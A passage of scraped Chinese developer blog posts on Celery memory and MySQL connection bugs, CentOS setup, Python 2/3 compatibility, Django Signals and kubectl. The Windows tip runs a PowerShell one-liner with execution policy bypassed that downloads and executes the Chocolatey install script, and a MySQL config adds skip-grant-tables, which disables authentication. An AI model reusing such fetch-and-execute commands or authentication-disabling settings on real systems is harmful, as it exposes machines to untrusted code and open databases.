\u0026#34;/app/.heroku/python/lib/python2.7/site-packages/pymysql/err.py\u0026#34;, line 115, in _check_mysql_exception raise InternalError(errno, errorvalue) django.db.utils.InternalError: (1050, u\u0026#34;Table \u0026#39;djcelery_crontabschedule\u0026#39; already exists\u0026#34;) 在 django-celery 的 GitHub 更新日志中提到：\n在 3.1.17 更新版本之后，新增了 Django migrations。 如果已经存在 djcelery_* 等表，则会导致执行 $python manage.py migrate 时报错。升级依赖的版本库时，需要注意版本的兼容性。\n4. 如何合并两个 fork 仓库 查看本地远程源：\n1 2 3 git remote -v origin https://github.com/yourname/celery.git (fetch) origin https://github.com/yourname/celery.git (push) 添加需要合并的远程源：\n1 git remote add upstream https://github.com/celery/celery.git 查看本地远程源：\n1 2 3 4 5 git remote -v origin https://github.com/yourname/celery.git (fetch) origin https://github.com/yourname/celery.git (push) upstream https://github.com/celery/celery.git (fetch) upstream https://github.com/celery/celery.git (push) 获取远程源的最新更新：\n1 2 3 4 git fetch upstream From https://github.com/celery/celery * [new branch] var.ci -\u0026gt; upstream/var.ci * [new branch] workhorse-pool -\u0026gt; upstream/workhorse-pool 合并远程 fork 分支到当前分支：\n1 git merge upstream/master 5. 监控 Celery 的工具 - Flower Flower 是基于 Web 的 Celery 监控和管理工具。提供的功能有：\n查看 worker 状态和统计信息 关闭和重启 worker 实例 控制 worker 池的大小 显示 task 详细信息 查看当前运行的 task 查看 tasks 的调度 唤醒和终止tasks \u0026hellip; 安装：\n1 pip install flower 运行：\n1 python manage.py celery flower 打开：http://localhost:5555，访问：\n","description":"","id":415,"section":"post","tags":["博文","Tips","Python"],"title":"开发 Tips（2）","uri":"https://www.chenshaowen.com/blog/developing-tips-2.html"},{"content":"1. 一个小需求 经常遇到一些小的需求，但是实现起来并不简单。这里就有一个文件上传的简单需求，分为下面几个步骤：\n用户在页面上传一个大文件 大文件会被暂存在内网的 Ceph 后台任务，将 Ceph 中的大文件，下载到 Docker 内 后台任务，将 Docker 中的大文件，上传到外网的 COS 后台使用的是 Django，采用 Docker 多实例部署。多实例方便扩容，提高服务的并发能力，但是要求实例无状态，有状态的部分需要存储在第三方服务，Ceph 就是其中之一。\n直接将文件从本地上传到 COS ，会导致正在上传的文件因为发布而被丢失。\n2. 一个大文件引发的 Bug 在测试的过程中，发现小文件可以正常上传；但是上传大于 300MB 的文件时，总是失败。日志如下：\n1 2 3 4 5 [2018-10-23 10:11:18] celery: [2018-10-23 10:11:18,114: ERROR/MainProcess] Process \u0026#39;Worker-20\u0026#39; pid:45 exited with \u0026#39;signal 9 (SIGKILL)\u0026#39; [time_stamp=2018-10-23 10:11:18,114, worker=MainProcess, levelname=ERROR] [2018-10-23 10:11:18] celery: [2018-10-23 10:11:18,206: ERROR/MainProcess] Pool callback raised exception: OperationalError(2006, \u0026#34;MySQL server has gone away (error(32, \u0026#39;Broken pipe\u0026#39;))\u0026#34;) [time_stamp=2018-10-23 10:11:18,206, worker=MainProcess, levelname=ERROR] [2018-10-23 10:11:18] celery: self._execute_command(COMMAND.COM_QUERY, sql) [2018-10-23 10:11:18] celery: File \u0026#34;/app/.heroku/python/lib/python2.7/site-packages/pymysql/connections.py\u0026#34;, line 970, in _execute_command [2018-10-23 10:11:18] celery: Traceback (most recent call last): 使用的包版本:\n1 2 3 Django==1.8.3 celery==3.1.18 django-celery==3.1.16 日志中有两个错误，一个是进程被杀掉，一个是数据库失去连接。最开始将问题定位在 MySQL server has gone away，但一直没有解决问题。\n最后，在 Grafana 中查看 Celery Worker 的内存使用率时，发现每次上传大文件，内存使用率就会急剧增加，然后又急剧下降。原来是，内存使用超了，进程被强制 kill。\n最后，通过优化内存使用，解决了问题。\n3. 一段优化代码 优化之前：\n1 2 3 4 5 r = requests.get(self.local_file.url, allow_redirects=True, stream=True, timeout=300) open(self.local_path, \u0026#39;wb+\u0026#39;).write(r.content) 优化之后：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 if not os.path.exists(os.path.dirname(self.local_path)): try: os.makedirs(os.path.dirname(self.local_path)) except OSError as exc: if exc.errno != errno.EEXIST: raise r = requests.get(self.local_file.url, allow_redirects=True, stream=True, timeout=300) with open(self.local_path, \u0026#39;wb\u0026#39;) as f: for chunk in r.iter_content(chunk_size=1024 * 512): if chunk: f.write(chunk) 优化之前，Celery 将整个文件放在内存，内存使用率暴增。优化之后，先请求响应头，通过迭代器一点一点读取响应体中的文件内容。这大大节省了内存使用。\n4. 一个数据库连接异常问题 找到问题，解决之后，并没有结束。这里有一个奇怪的问题，为什么会出现 MySQL server has gone away。\n同事之前也遇到一个类似的问题，Celery 多进程任务抛出各种数据库异常。原因分析如下：\nCelery Worker 在启动时，djcelery 进行了 DB 操作，数据库连接被初始化。 子进程被 fork 出来后，由于完全复制了父进程的内存数据，导致所有 Worker 共享了同一个 MySQL 连接（同一个 socket file）。由于 persistent connections 特性，数据库连接没有被关闭。这个是 djcelery 库与多线程部署的坑。 解决方案是：\n不关闭 persistent connections 功能，监听子进程初始化完成和任务开始的信号。在收到信号时，手动强制关闭当前进程中 Django ORM 的连接。 相关实现的代码如下：\n1 2 3 4 5 6 7 8 9 10 11 from django.db import connections @signals.task_prerun.connect def task_prerun(**kwargs): for conn in connections.all(): conn.close() @signals.worker_process_init.connect def worker_init(**kwargs): for conn in connections.all(): conn.close() 实际上，这里的 signal 9 (SIGKILL) 和 MySQL server has gone away 并不是同一个 Celery Worker 抛出。由于继承自同一个父进程和连接池，当其中一个子进程被 kill 之后，另外一个正在处理任务的进程也会出问题。\n5. 一段相关的 Django 代码 在高并发情况下，频繁新建/关闭数据库连接是低效的。Django 的 persistent connections（长连接） 就是为了解决这个问题。\nDjango 数据库长连接的原理是，在每次创建数据库连接之后，把连接实例放到一个 Theard.local 的实例中维护。每次进行数据库请求时，Django 会去 local 中查找可用的连接，有则复用。当连接，发生异常或者存在时间超过 CONN_MAX_AGE 时，才会被关闭。\nCONN_MAX_AGE 参数，在 settings.py 文件中可以配置：\n1 2 3 4 5 6 7 8 9 10 11 DATABASES = { \u0026#39;default\u0026#39;: { \u0026#39;ENGINE\u0026#39;: \u0026#39;django.db.backends.mysql\u0026#39;, \u0026#39;NAME\u0026#39;: \u0026#39;mydb\u0026#39;, # 数据库名称 \u0026#39;USER\u0026#39;: \u0026#39;root\u0026#39;, # 数据库用户名 \u0026#39;PASSWORD\u0026#39;: \u0026#39;\u0026#39;, # 数据库密码 \u0026#39;HOST\u0026#39;: \u0026#39;localhost\u0026#39;, # 数据库主机，默认为 localhost \u0026#39;PORT\u0026#39;: \u0026#39;3306\u0026#39;, # 数据库端口 \u0026#39;CONN_MAX_AGE\u0026#39;: 60, # 0 表示使用完马上关闭，None 表示不关闭 } } 再来看看，Django 中如何管理长连接：\ndjango/db/__init_.py\n1 2 3 def close_old_connections(**kwargs): for conn in connections.all(): conn.close_if_unusable_or_obsolete() django/db/backends/base/base.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 def close_if_unusable_or_obsolete(self): if self.connection is not None: # If the application didn\u0026#39;t restore the original autocommit setting, # don\u0026#39;t take chances, drop the connection. if self.get_autocommit() != self.settings_dict[\u0026#39;AUTOCOMMIT\u0026#39;]: self.close() return # If an exception other than DataError or IntegrityError occurred # since the last commit / rollback, check if the connection works. if self.errors_occurred: if self.is_usable(): self.errors_occurred = False else: self.close() return if self.close_at is not None and time.time() \u0026gt;= self.close_at: self.close() return django/db/backends/mysql/base.py\n1 2 3 4 5 6 7 def is_usable(self): try: self.connection.ping() except Database.Error: return False else: return True 6. 参考 https://github.com/celery/django-celery/issues/359 ","description":"","id":416,"section":"post","tags":["博文","Celery","故障","排查","大文件","问题"],"title":"Celery 处理大文件失败问题排查与解决","uri":"https://www.chenshaowen.com/blog/solving-the-problem-of-celery-processe-large-file-failure.html"},{"content":"1. 更换镜像源 首先备份官方的源\n1 mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup 下载新的源到 /etc/yum.repos.d/\nCentOS 5\n1 wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-5.repo CentOS 6\n1 wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo CentOS 7\n1 wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo 生成元数据缓存\n1 yum makecache 2. 访问 NTFS 文件系统 Linux 内核目前只支持对微软 NTFS 文件系统的读取。 ntfs-3g 是微软 NTFS 文件系统的一个开源实现，同时支持读和写。\nntfs-3g 在 epel-release 源中，执行命令查找 epel 源：\n1 yum search epel 安装 epel-release 源：\n1 yum install epel-release.noarch 安装 ntfs-3g，执行命令：\n1 yum install ntfs-3g 3. 修复 Grub 引导 Windows 由于Linux系统不能识别 Windows 操作系统的分区，所以还得先安装 ntfs-3g。\n恢复 grub 配置文件，只需要一条命令：\n1 grub2-mkconfig -o /boot/grub2/grub.cfg 4. 安装 Google Chrome 添加源\n1 2 3 4 5 6 7 8 cat \u0026lt;\u0026lt; EOF \u0026gt; /etc/yum.repos.d/google-chrome.repo [google-chrome] name=google-chrome baseurl=http://dl.google.com/linux/chrome/rpm/stable/x86_64 enabled=1 gpgcheck=1 gpgkey=https://dl.google.com/linux/linux_signing_key.pub EOF 安装可以选稳定版、测试版：\n1 yum install google-chrome-stable 或\n1 yum install google-chrome-beta 5. 安装 VS Code 添加源\n1 2 rpm --import https://packages.microsoft.com/keys/microsoft.asc sh -c \u0026#39;echo -e \u0026#34;[code]\\nname=Visual Studio Code\\nbaseurl=https://packages.microsoft.com/yumrepos/vscode\\nenabled=1\\ngpgcheck=1\\ngpgkey=https://packages.microsoft.com/keys/microsoft.asc\u0026#34; \u0026gt; /etc/yum.repos.d/vscode.repo\u0026#39; 安装：\nyum install code ","description":"","id":417,"section":"post","tags":["博文","Tips","CentOS"],"title":"安装 Centos 之后，需要做的几件事","uri":"https://www.chenshaowen.com/blog/after-install-centos.html"},{"content":" Python2 到 Python3 是一个较大的版本更新。目前，生产环境依然有大量项目使用的是 Python2。但，这并不意味着项目会一直停留在 Python2，开发者也需要考虑项目对 Python3 的兼容性，以方便迁移，同时也是对新知识的学习。下面是一些学习的知识点整理。\n1. Python2 升级 Python3 贸然地升级 Python3 ，无疑将会面临巨大风险。充分地了解 Python2 和 Python3 的区别，学习 Python3 的新特性，预留时间，制定升级计划是必须的。\n单元测试。\n单元测试能跑通，是平稳升级的重要保障。单元测试能够验证升级前后，功能是否一致。如果项目没有单元测试，那么在升级之前应该补上。 py2 → six → py3。\n升级到 Python3，最大的难点在于，改变开发人员的使用习惯。比如，在 Python2 中推荐的 xrange， 在 Python3 中却不能用。开发人员需要一个学习和适应的过程。推荐的策略是，新的功能代码兼容 Python3，逐步重构存量代码。 2. __future__ 模块 Python 的新版本会引入新的特性，但是，实际上这些特性在上一个版本中就已经存在。要使用某一新的特性，可以通过导入 __future__ 模块来实现。\n__future__ 包括下面几个新特性：\n上面，表中第一列包含了所有可以从 __future__ 中导入的特性，optional in 中的版本号为最低可使用的版本，mandatory in 中的版本号为已经实现，无需从 __future__ 导入的版本号。最后一列是每个新特性所对应的 PEP 及简单描述。下面是部分 Python3 的新特性示例：\n2.1 打印函数 使用 Python3 的 print 函数，禁用 Python2 的 print 语句\n1 2 3 from __future__ import print_function print(123) 123 2.2 文本字符串 字符串字面量的类型为文本（Python2 中的 unicode，Python3 中的 str），而不是字节（Python2中的 str，Python3 中的 bytes）。\n1 2 3 # -*- coding: utf-8 -*- from __future__ import unicode_literals print(\u0026#39;试试看\u0026#39;) 2.3 引入模块时，优先绝对路径 使用绝对路径导入模块时，Python 会在 sys.path 里寻找模块。\n在Python 2.4 或之前, Python 会先查找当前目录下有没有模块, 若找到了，则引入该模块。\n1 from __future__ import absolute_import 2.4 使用浮点除法 Python3 中 int 除以 int 得float，而 Python2 使用的是整除。\n1 2 3 from __future__ import division print 3/2 1.5 3. six 模块 six 是一个专门用来兼容 Python 2 和 Python 3 的库。six 重新定义了在 Python2 和 Python3 中有差异的函数，six 会根据 Python 解释器的版本调用合适的处理函数。\n3.1 常量定义兼容 six.PY2/ six.PY3 ，布尔值。检查编译器版本是否为 Python2 或 Python3 six.class_types，类类型。在 Python2 中包含旧类和新类。在 Python3 中只是新类 six.integer_types，整数类型。在 Python2 中是 long 或 int，在 Python3 中是 int six.string_types，文本数据的类型。Python2 中是 basestring() ， Python3 中是 str six.text_type，用于表示（Unicode）文本数据的类型。Python2 中是 unicode() ，Python3 中是 str（Pyhon3 对文本数据进行了整合，默认为 Unicode 文本数据） six.binary_type，二进制数据的类型。Python2中是 str，Python3 中是 bytes six.MAXSIZE， list 或 dict 等容器的最大尺寸。这相当于 Python 2.6 及更高版本（包括3.x）的 sys.maxsize。在 Python3 中没有直接的等价物， 因为它的整数类型的长度仅受限于内存大小 使用示例：\n1 2 3 4 5 6 7 8 9 import six def dispatch_types(value): if isinstance(value, six.integer_types): handle_integer(value) elif isinstance(value, six.class_types): handle_class(value) elif isinstance(value, six.string_types): handle_string(value) 3.2 模块位置兼容 Python3 重新组织了很多模块的位置，例如 Python2 的 HTMLParser，在 Python3 中是 html.parser。\n可以使用 six 导入，兼容模块导入：\n1 from six.moves import html_parser 在大多数情况下，six.moves 别名是 Python3 中模块的名称。\n在 这里 ，你可以看到一个 Supported renames 名单。\n其他\n其他的内容可以在官方的文档找到，基本上就是通过six来调用，而不是自己对Python判断。包括：\n3.3 其他 除了上面的兼容性操作，six 还提供了：\n二进制和文本数据的兼容 uniittest assert的兼容 urllib 库改动的兼容 高级的自定义move 4. 参考 http://tips.pyhub.cc/zh/latest/2016-04-12-Module-future/ https://pythonhosted.org/six/ ","description":"","id":418,"section":"post","tags":["博文","Python","兼容"],"title":"编写 Python2、Python3 兼容的代码","uri":"https://www.chenshaowen.com/blog/writing-python2-python3-compatible-code.html"},{"content":" 主要记录最近遇到的一些开发问题，解决方法。\n1. warning: LF will be replaced by CRLF Windows、Linux 和 Mac 在处理文件换行时，标示符是不一致的。Windows 使用 CRLF 作为结束符，而 Linux 和 Mac 使用 LF 作为结束符。\n对待换行符，Git 有两种模式。查看 Git 配置。\n1 git config core.autocrlf 如果显示为 true，则每一次当你 git commit 时，如果存在文本文件，那么 git 会自动帮你将末尾的换行符改为 CRLF，省去了烦心的转换工作。\n如果显示为 false，则 git 不会对换行符进行修改，保持原始的内容。\nLinux 和 Mac 开发者，这个配置应当为 false，而 Windows 开发者，则应当设置为 true。\n1 git config --global core.autocrlf false 2. Python 可迭代对象的排序 可迭代对象 iterable 主要包括 3 类：\n全部序列类型，比如 list(列表)、str(字符串)、tuple(元组) 部分非序列类型，比如 dict(字典)、file(文件) 包含 __iter__() 或 __getitem__() 方法的对象 sort 是 list 对象的一个方法，sorted 可以对所有可迭代的对象进行排序操作。不同的是 sort 在原位重新排列列表，而 sorted() 是产生一个新的列表。有关排序的基本概念：\niterable\n可迭代对象 cmp\n比较函数，需要两个参数 key\n比较的元素，只有一个参数 reverse\n排序规则，reverse = True 降序 ， reverse = False 升序 2.1 sort 函数 原型：\n1 list.sort(cmp=None, key=None, reverse=False) 使用实例：\n1 2 3 4 my_list = [\u0026#39;3\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;u\u0026#39;, 9] my_list.sort(reverse=True) print my_list [\u0026#39;u\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;3\u0026#39;, 9] 1 2 3 4 5 6 def takeSecond(elem): return elem[1] mylist = [(2, 2), (3, 4), (42, 1), (41, 1), (1, 3)] mylist.sort(key=takeSecond) print mylist [(42, 1), (41, 1), (2, 2), (1, 3), (3, 4)] 2.2 sorted 函数 原型：\n1 sorted(iterable, cmp=None, key=None, reverse=False) 使用实例：\n1 2 3 mylist = [5, 2, 3, 1, 4] print sorted(mylist, reverse=True) [5, 4, 3, 2, 1] 1 2 3 mylist = [(\u0026#39;b\u0026#39;, 2), (\u0026#39;a\u0026#39;, 1), (\u0026#39;c\u0026#39;, 3), (\u0026#39;d\u0026#39;, 4)] print sorted(mylist, cmp=lambda x, y: cmp(x[1], y[1])) [(\u0026#39;a\u0026#39;, 1), (\u0026#39;b\u0026#39;, 2), (\u0026#39;c\u0026#39;, 3), (\u0026#39;d\u0026#39;, 4)] 指定多个排序关键字，先按照 x[1]，再按照 x[0] 排序。\n1 2 3 mylist = [(\u0026#39;d\u0026#39;, 2), (\u0026#39;a\u0026#39;, 4), (\u0026#39;b\u0026#39;, 3), (\u0026#39;c\u0026#39;, 2)] print sorted(mylist, key=lambda x: (x[1], x[0])) [(\u0026#39;c\u0026#39;, 2), (\u0026#39;d\u0026#39;, 2), (\u0026#39;b\u0026#39;, 3), (\u0026#39;a\u0026#39;, 4)] 3. 如何启动 Windows 下的免安装版 MySQL 修改配置文件 my.ini：\n1 2 3 4 5 [mysqld] port=3306 basedir=C:\\\\tools\\\\mysql\\\\current datadir=C:\\\\ProgramData\\\\MySQL\\\\data skip-grant-tables 新增 skip-grant-tables 用于跳过权限表的限制，不用验证密码，直接登录。\n将 MySQL 注册为系统服务\n1 \u0026#34;C:\\tools\\mysql\\current\\bin\\mysqld\u0026#34; --install MySQL --defaults-file=\u0026#34;C:\\tools\\mysql\\current\\my.ini\u0026#34; 启动 MySQL\n1 net start mysql 4. pymysql 替换 MySQL-python MySQL-python 已停止更新，只支持 Python2，不支持 Python3 ，并且依赖复杂，安装麻烦。\npymysql 为替代 MySQL-python 而生，纯 Python 编写，接口与 MySQL-python 兼容，安装方便，支持 Python3。\n下面是替换方法：\n1 2 3 import pymysql pymysql.install_as_MySQLdb() 5. Windows 下快速搭建开发环境 将工作 PC 的操作系统升级到 Windows 10，下面是我快速搭建 Python 开发环境的步骤：\n管理员权限， CMD 下执行：\n1 @\u0026#34;%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u0026#34; -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command \u0026#34;iex ((New-Object System.Net.WebClient).DownloadString(\u0026#39;https://chocolatey.org/install.ps1\u0026#39;))\u0026#34; \u0026amp;\u0026amp; SET \u0026#34;PATH=%PATH%;%ALLUSERSPROFILE%\\chocolatey\\bin\u0026#34; 新建文件 packages.config，内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;packages \u0026gt; \u0026lt;package id=\u0026#34;foxitreader\u0026#34; /\u0026gt; \u0026lt;package id=\u0026#34;googlechrome\u0026#34; /\u0026gt; \u0026lt;package id=\u0026#34;winrar\u0026#34; /\u0026gt; \u0026lt;package id=\u0026#34;everything\u0026#34; /\u0026gt; \u0026lt;package id=\u0026#34;notepadplusplus\u0026#34; /\u0026gt; \u0026lt;package id=\u0026#34;vscode\u0026#34; /\u0026gt; \u0026lt;package id=\u0026#34;msys2\u0026#34; /\u0026gt; \u0026lt;package id=\u0026#34;conemu\u0026#34; /\u0026gt; \u0026lt;package id=\u0026#34;git\u0026#34; /\u0026gt; \u0026lt;package id=\u0026#34;tortoisesvn\u0026#34; /\u0026gt; \u0026lt;package id=\u0026#34;hg\u0026#34; /\u0026gt; \u0026lt;package id=\u0026#34;python2\u0026#34; /\u0026gt; \u0026lt;package id=\u0026#34;pip\u0026#34; /\u0026gt; \u0026lt;package id=\u0026#34;vcpython27\u0026#34; /\u0026gt; \u0026lt;package id=\u0026#34;jdk8\u0026#34; /\u0026gt; \u0026lt;package id=\u0026#34;nvm\u0026#34; /\u0026gt; \u0026lt;package id=\u0026#34;redis-64\u0026#34; /\u0026gt; \u0026lt;package id=\u0026#34;mysql\u0026#34; /\u0026gt; \u0026lt;package id=\u0026#34;rabbitmq\u0026#34; /\u0026gt; \u0026lt;package id=\u0026#34;docker-for-windows\u0026#34; /\u0026gt; \u0026lt;/packages\u0026gt; 执行命令，安装软件：\n1 choco install packages.config -y 将 C:\\tools\\msys64\\usr\\bin 目录加入 PATH，从 gist 上下载 VS Code 的配置，这样基本开发软件就全都有了。\n主要使用的 Console 是 Powershell，执行 bash 可以进入 msys2。\n","description":"","id":419,"section":"post","tags":["博文","Tips","Python","研发"],"title":"开发 Tips（1）","uri":"https://www.chenshaowen.com/blog/developing-tips-1.html"},{"content":" 最近，我负责开发一个重后端的应用。这个应用数据流向复杂，处理逻辑冗余堆积。项目技术栈选择的是 Django + Vuejs。前端使用 Webpack 打包，模块化管理，主要是展示数据。后端涉及的模块多，处理规则多，数据表多，每次涉及之前功能修改时，都消耗大量时间 review 代码。这让我意识到，在复杂应用中，解耦模块非常重要。下面是一些思考和实践。\n1. 观察者模式 在实践中，我主要使用的是 Django Signal，实现对模块的解耦。Django Signal 是 Django 对观察者模式的实现和应用。因此，有必要先了解一下观察者模式。\n观察者模式是软件设计模式的一种。通常，大家会使用等式：发布 + 订阅 = 观察者模式。来表达对观察者模式的理解。实际上，这个等式并不完全正确。\n发布订阅模式与观察者模式区别：\n发布订阅模式的通信依赖于消息队列（RabbitMQ、RocketMQ、ActiveMQ、Kafka、ZeroMQ、MetaMq等），属于异步；观察者模式通常是同步的 发布订阅模式松散耦合，发布者和订阅者甚至所属不同应用；观察者模式所属一个应用 在实现上，观察者模式，需要维护一个订阅列表。当状态发生改变时，自动通知列表中的全部对象。\n2. Django Signal Signal 是 Django 框架中提供的一个信号分发器。发送器发送信号，通知一系列的接收器，从而触发接收器执行一些操作。\n需要注意的是，Django 信号是同步的。如果滥用，会影响到 Django 的处理效率。\n下面我会以 Django 1.8.3 为例，从一个使用案例出发，再到源码，介绍 Django 中 Signal 的实现方式。\n2.1 一个简单的使用案例 这里有一个小需求：在 MyModel 表执行 save 后，触发一些执行逻辑。\n加载 Signal myApp/__init__.py\n1 2 # -*- coding: utf-8 -*- default_app_config = \u0026#39;myApp.apps.MyAppConfig\u0026#39; myApp/apps.py\n1 2 3 4 5 6 7 8 9 # -*- coding: utf-8 -*- from django.apps import AppConfig class MyAppConfig(AppConfig): name = \u0026#39;myApp\u0026#39; def ready(self): import myApp.signals.handlers 绑定信号处理函数 myApp/signals/handlers.py\n1 2 3 4 5 6 7 8 9 10 11 # -*- coding: utf-8 -*- from django.dispatch import receiver from django.db.models.signals import post_save from myApp.models import MyModel @receiver(post_save, sender=MyModel, dispatch_uid=\u0026#34;mymodel_post_save\u0026#34;) def my_model_handler(sender, **kwargs): # 这里写 MyModel 执行 save 后的逻辑 pass 2.2 从源码理解 Django Signal 处理逻辑 上面的例子，使用了极少量的代码，就享受到了 Django 提供的信号处理机制所带来的便利。但是，如果仅仅停留在使用，你可能无法对 Django Signal 有更深入的了解。下面，从源码来看看 Django Signal 的处理逻辑。\n声明信号 Django 内置了大量 Model 相关的信号，可以直接使用。上面例子使用的信号 post_save ，就是 ModelSignal 类的一个实例，而 ModelSignal 又继承自 Signal 类。\ndjango/db/models/signal.py\n1 2 3 4 5 6 7 8 9 from django.dispatch import Signal class ModelSignal(Signal): def connect(self, receiver, sender=None, weak=True, dispatch_uid=None): super(ModelSignal, self).connect( receiver, sender=sender, weak=weak, dispatch_uid=dispatch_uid ) post_save = ModelSignal(providing_args=[\u0026#34;instance\u0026#34;, \u0026#34;raw\u0026#34;, \u0026#34;created\u0026#34;, \u0026#34;using\u0026#34;, \u0026#34;update_fields\u0026#34;], use_caching=True) 注册信号处理函数 Django 提供的 receiver 函数是一个装饰器，被修饰的函数作为参数注册到接收器对象列表。\ndjango/dispatch/__init__.py\n1 from django.dispatch.dispatcher import Signal, receiver django/dispatch/dispatcher.py\n1 2 3 4 5 6 7 8 9 def receiver(signal, **kwargs): def _decorator(func): if isinstance(signal, (list, tuple)): for s in signal: s.connect(func, **kwargs) else: signal.connect(func, **kwargs) return func return _decorator django/dispatch/dispatcher.py\n1 2 3 4 5 class Signal(object): def __init__(self, providing_args=None, use_caching=False): self.receivers = [] def connect(self, receiver, sender=None, weak=True, dispatch_uid=None): self.receivers.append((lookup_key, receiver)) 发送信号 在 save 完成之后，Django 会主动发出 post_save 信号；如果是自定义信号，那么需要自行触发。。\ndjango/db/models/base.py\n1 2 3 4 5 6 7 class Model(six.with_metaclass(ModelBase)): # 触发 Model 相关的信号 def save_base(self, raw=False, force_insert=False, force_update=False, using=None, update_fields=None): # Signal that the save is complete signals.post_save.send(sender=origin, instance=self, created=(not updated), update_fields=update_fields, raw=raw, using=using) 处理信号 处理信号，实际上就是依次调用接受器列表中的函数。\ndjango/dispatch/dispatcher.py\n1 2 3 4 5 6 7 8 class Signal(object): def send(self, sender, **named): responses = [] for receiver in self._live_receivers(sender): response = receiver(signal=self, sender=sender, **named) responses.append((receiver, response)) return responses 3. 信号解耦，任务异步 在学习了观察者模式，了解 Django Signal 之后，就基本掌握了 Django 模块解耦的基础知识。接着，需要进一步明确模块之间的耦合机制，制定项目约定，就可以利落地实践了。\n梳理一下请求的处理链路：\n请求经过接入层、中间件处理之后，由 URL 分发器匹配到合适的处理模块，最终某个模块负责返回响应。各个模块连接数据库、消息队列、对象存储保存状态。\n每个模块包含四部分：\nAppLogic，模块的应用逻辑 Signal，模块内置的信号 SignalHandle，模块关注的信号处理句柄 CeleryTasks，模块的异步任务 模块与模块之前完全通过信号耦合：\n由于 Django Signal 是同步处理机制，为了支持异步处理，可以结合 Celery 和 RabbitMQ 进行实践。\n下面是一个信号处理异步逻辑的例子：\nmyApp/tasks.py\n1 2 3 4 5 6 7 # -*- coding: utf-8 -*- from celery import task @task(ignore_result=True) def my_task(instance): pass myApp/signals/handlers.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # -*- coding: utf-8 -*- from django.dispatch import receiver from django.db.models.signals import post_save from myApp.models import MyModel from myApp.tasks import my_task @receiver(post_save, sender=MyModel, dispatch_uid=\u0026#34;mymodel_post_save\u0026#34;) def my_model_handler(sender, **kwargs): instance = kwargs[\u0026#39;instance\u0026#39;] # 异步 my_task.apply_async(args=[instance]) # 同步 pass ","description":"","id":420,"section":"post","tags":["博文","Django","设计","解耦","Demo"],"title":"如何使用 Django Signal 解耦模块","uri":"https://www.chenshaowen.com/blog/how-to-use-django-signal-decoupling-module.html"},{"content":"1. Kubectl 基本命令 1.1 创建对象 1 2 3 4 5 6 7 8 # 创建资源，也可以使用远程 URL kubectl create -f ./my.yaml # 使用多个文件创建资源 kubectl create -f ./my1.yaml -f ./my2.yaml # 使用目录下的所有清单文件来创建资源 kubectl create -f ./dir # 启动一个 nginx 实例 kubectl run nginx --image=nginx 1.2 显示和查找资源 1 2 3 4 5 6 7 8 # 列出所有 namespace 中的 service kubectl get services # 列出所有 namespace 中的 pod kubectl get pods --all-namespaces # 列出 kube-system 中的 pod kubectl get pods -n kube-system # 列出所有 pod 并显示详细信息 kubectl get pods -o wide 1.3 更新资源 1 2 3 4 5 6 7 8 9 10 # 滚动更新 pod frontend-v1 kubectl rolling-update frontend-v1 -f frontend-v2.json # 更新资源名称并更新镜像 kubectl rolling-update frontend-v1 frontend-v2 --image=image:v2 # 更新 frontend pod 中的镜像 kubectl rolling-update frontend --image=image:v2 # 强制替换，删除后重新创建资源。会导致服务中断。 kubectl replace --force -f ./pod.json # 为 nginx RC 创建服务，启用本地 80 端口连接到容器上的 8000 端口 kubectl expose rc nginx --port=80 --target-port=8000 1.4 删除资源 1 2 3 4 5 6 7 8 9 10 # 删除 pod.json 文件中定义的类型和名称的 pod kubectl delete -f ./pod.json # 删除名为 \u0026#34;baz\u0026#34; 的 pod 和名为 \u0026#34;foo\u0026#34; 的 service kubectl delete pod, service baz foo # 删除具有 name=myLabel 标签的 pod 和 serivce kubectl delete pods, services -l name=myLabel # 删除具有 name=myLabel 标签的 pod 和 service，包括尚未初始化的 kubectl delete pods, services -l name=myLabel --include-uninitialized # 删除 my-ns namespace 下的所有 pod 和 serivce，包括尚未初始化的 kubectl -n my-ns delete po,svc --all 1.5 与运行中的 Pod 交互 1 2 3 4 5 6 7 8 9 10 # 流式输出 pod 的日志（stdout kubectl logs -f my-pod # 流式输出 pod 中容器的日志（stdout，pod 中有多个容器的情况下使用） kubectl logs -f my-pod -c my-container # 交互式 shell 的方式运行 pod kubectl run -i --tty busybox --image=busybox -- sh # 连接到运行中的容器 kubectl attach my-pod -i # 在已存在的容器中执行命令（pod 中有多个容器的情况下） kubectl exec my-pod -c my-container -- ls / 2. Dashboard 简介 Kubernetes Dashboard 是一个管理 Kubernetes 集群的全功能 Web 界面，旨在以 UI 的方式完全替代命令行工具（kubectl 等）。\n在 Dashboard 页面上，可以查看 Kubernetes 的集群状态，对集群进行相关的操作。但是，Dashboard 无法图形化展现集群度量指标信息，需要安装 Heapser 插件。\n下面来了解一下 Kubernetes 的监控系统，并配置监控试试。\n3. 监控系统 架构图如下：\ncAdvisor，是 Kubelet 内置的容器资源收集工具。它会自动收集本机容器 CPU、内存、网络和文件系统的资源占用情况，并对外提供 API。 InfluxDB，是一个开源分布式时序、事件和指标数据库。 Grafana，是 InfluxDB 的 Dashboard，提供了强大的图表展示功能。常和 InfluxDB 组合使用，展示图表化的监控数据。 Heapster，提供了整个集群的资源监控，并支持持久化数据存储到 InfluxDB 等后端存储。 kube-state-metrics，除了配置 cAdvisor、Heapster、Influx、Grafana，还可以考虑部署 kube-state-metrics。kube-state-metrics 会轮询 Kubernetes API 调度了多少个replicas、现在可用的有几个、多少个 Pod 是 running、stopped、terminated 状态、Po 重启了多少次。 4. 配置监控 获取官方配置 yaml：\n1 2 3 4 5 6 git clone https://github.com/kubernetes/heapster.git # 查看 yaml 配置列表 ls -l deploy/kube-config/influxdb/ grafana.yaml heapster.yaml 